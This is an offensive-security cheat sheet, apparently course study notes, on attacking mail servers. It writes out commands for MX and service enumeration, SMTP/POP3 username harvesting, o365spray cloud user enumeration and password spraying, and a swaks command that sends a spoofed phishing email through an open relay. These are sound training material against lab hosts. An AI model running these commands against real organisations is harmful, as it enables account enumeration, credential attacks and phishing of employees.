# 🛰️ Email Services Attack Cheat Sheet

> [!info] 🧠 What is a Mail Server?
> 
> Bash
> 
> ```
> A network server infrastructure responsible for handling, routing, and delivering electronic mail messages across local or global networks.
> ```
> 
> 💡 Allows administrators to:
> 
> - Route outbound client communication messages securely across internal and public network boundaries.
>     
> - Store and organize operational message data structures hierarchically within data mailboxes.
>     
> - Synchronize mail delivery status queues across distributed desktop and mobile endpoints.
>     
> 
> ✔ Common in:
> 
> - Cloud suites (Microsoft 365, Google Workspace) and on-premises corporate infrastructure deployments.
>     

> [!tip] 🔧 Core Idea
> 
> Bash
> 
> ```
> Client Application (Mail Agent) ↔ SMTP Server (Outbound Routing) ↔ POP3/IMAP Server (Storage Node)
> ```
> 
> 💡 Key Ports:
> 
> - **TCP 25 & 587** → SMTP Routing (Handles outgoing message relay operations by default).
>     
> - **TCP 143 & 993** → IMAP Subsystem (Synchronizes persistent mailbox data states across multiple hosts).
>     
> 
> ✔ Think of it as **a digital postal sorting facility that dynamically routes letters globally while offering physical secure storage lockboxes for receipt retrieval**.

# 🌳 Structure: Navigation & Protocol Routing

> [!info] 📚 Outbound Transmission Mechanics
> 
> Bash
> 
> ```
> SMTP # Simple Mail Transfer Protocol handles client-to-server and server-to-server message relays
> ```
> 
> 💡 Function:
> 
> - Implements textual instructions to structure sender mappings, destination delivery addresses, and connection routing requests.
>     

> [!tip] 📥 Inbound Message Retrieval
> 
> Bash
> 
> ```
> POP3  # Legacy data delivery structure; downloads messages locally and clears them from the server cache
> IMAP4 # Modern state replication engine; retains master files on the core host for multi-device sync
> ```
> 
> 💡 Logic:
> 
> - Attacks focus on exploiting visible lookup configurations to harvest user records, brute-forcing network authentication interfaces, or hijacking relay endpoints for phishing campaigns.
>     

# 🔐 Access Methods

|**Authentication Type**|**Credentials Required**|**Risk Level**|**Notes**|
|---|---|---|---|
|**Anonymous Relay / Connection**|None Specified (Anonymous Context)|**CRITICAL**|Severe misconfiguration; permits arbitrary external actors to mask phishing origins using corporate signatures|
|**Targeted Password Spraying**|Valid Username + Guessed Password String|**HIGH**|Slipping past defense alarms by processing a single password across multiple account strings|
|**Legacy Command Verification**|Target Username Handle Only|**MEDIUM**|Abuses structural features (VRFY, EXPN, RCPT TO) to reconstruct user directories|

# 🔍 Footprinting & Enumeration

> [!success] 📡 Key Enumeration Tools
> 
> Bash
> 
> ```
> # 1. Track authoritative delivery handlers via DNS MX lookups
> host -t MX hackthebox.eu
> dig mx plaintext.do | grep "MX" | grep -v ";"
> 
> # 2. Map service banners and interactive capabilities via Nmap
> sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
> 
> # 3. Automate system username parsing
> smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
> ```
> 
> 💡 Flag breakdown:
> 
> - `-t MX` filters the domain zone file metadata strictly for the Mail eXchanger server aliases handling the target domain.
>     
> - `-M RCPT` commands the automated enum utility to use the RCPT TO authentication sequence to confirm active account loops.
>     

> [!info] 🔍 Information Revealed
> 
> - **Hosting Engine Topology:** Exposes whether a target relies on cloud architectures (e.g., outlook.com, google.com) or hosts private custom daemons (e.g., Postfix smtpd).
>     
> - **Active Directory Mappings:** Extracts verified corporate user list structures, isolating high-value internal personnel records for subsequent dictionary guessing.
>     

# ⚠️ Common Misconfigurations

> [!danger] 🔓 Exposed Diagnostic Commands & Open Relay Access
> 
> Bash
> 
> ```
> SMTP Service Policy: VRFY / EXPN Commands Enabled
> Routing Logic: Access Rule permits Outbound Mail Relay for Unauthenticated Sessions
> ```
> 
> 💡 Impact:
> 
> - **Active Verification:** Allows outside actors to perform instant confirmation scripts against arbitrary username files via unauthenticated telnet portals.
>     
> - **Unauthenticated Mail Spooling:** Enables external malicious actors to turn the corporate email instance into an anonymous transit station, transmitting phishing payloads that inherit the domain's strict security reputation.
>     

# 💥 Protocol-Specific Attacks

> [!warning] ⚙️ Text-Based Username Harvesting
> 
> Bash
> 
> ```
> # Query the SMTP VRFY handle natively
> telnet 10.10.110.20 25
> VRFY root
> 
> # Query the POP3 user validation state
> telnet 10.10.110.20 110
> USER john
> ```
> 
> 💡 Impact:
> 
> - Interrogates the software's internal verification responses (252 OK or +OK vs -ERR or 550 Unknown) to parse out real production credentials manually.
>     

> [!danger] 🎯 Cloud Infrastructure Enumeration (o365spray)
> 
> Bash
> 
> ```
> # 1. Validate if target is hosted under Microsoft Cloud layers
> python3 o365spray.py --validate --domain msplaintext.xyz
> 
> # 2. Target public API authentication flows to identify active users
> python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
> ```
> 
> 💡 Risk:
> 
> - Bypasses traditional infrastructure connection bans by tracking custom response differences on cloud authentication endpoints.
>     
> - Identifies valid Active Directory accounts without generating local network traffic alerts on the target subnet.
>     

> [!danger] 🔑 Weaponizing Open SMTP Relays via SWAKS
> 
> Bash
> 
> ```
> # 1. Enumerate relay misconfigurations via Nmap scripts
> nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
> 
> # 2. Inject an executive-spoofed phishing message over the wire
> swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Please complete the survey: http://mycustomphishinglink.com/' --server 10.10.11.213
> ```
> 
> 💡 Risk:
> 
> - Generates highly trustworthy phishing attacks by transmitting malicious scripts directly through the target's verified internal mail paths.
>     
> - Grants external actors the ability to bypass perimeter spam boundaries and domain authentication policies (like SPF/DKIM).
>     

# ⚡ Real-World Workflow

> [!success] 🧠 Attack Flow
> 
> Bash
> 
> ```
> 1. Run 'host -t MX' to evaluate if the mail network routing is self-hosted or bound to cloud structures.
> 2. If self-hosted, use Nmap to map open services across standard ports (25, 110, 143).
> 3. Connect via telnet to check if legacy verification blocks ('VRFY' or 'EXPN') exist.
> 4. Launch 'smtp-user-enum' to extract a verified target directory of valid corporate personnel.
> 5. If cloud-hosted, initiate 'o365spray' to passively identify live accounts via authentication APIs.
> 6. Execute low-and-slow password spray passes across the gathered user matrix via Hydra or o365spray.
> 7. Audit port 25 with 'smtp-open-relay' to check if you can spoof executive alerts using SWAKS.
> ```
> 
> 💡 Always review cloud-based spray parameters to prevent triggering automated lockout limits across modern enterprise directories.

# 🧩 Mental Model

> [!quote] 🎯 Protocol Hierarchy
> 
> Bash
> 
> ```
> MX Records   → The street sign directing postal trucks to the corporate loading dock
> VRFY / RCPT  → Asking the mailroom clerk if an employee works in a specific room
> Password Spraying → Sliding one common master key card into every door on the office floor
> Open Relay   → Leaving the corporate postage stamping machine on the outside loading dock for anyone to use
> ```
> 
> 💡 When an email server permits unauthenticated external traffic forwarding or leaks structural user validation responses, it relinquishes control of corporate identity verification and communication authority to outside threats.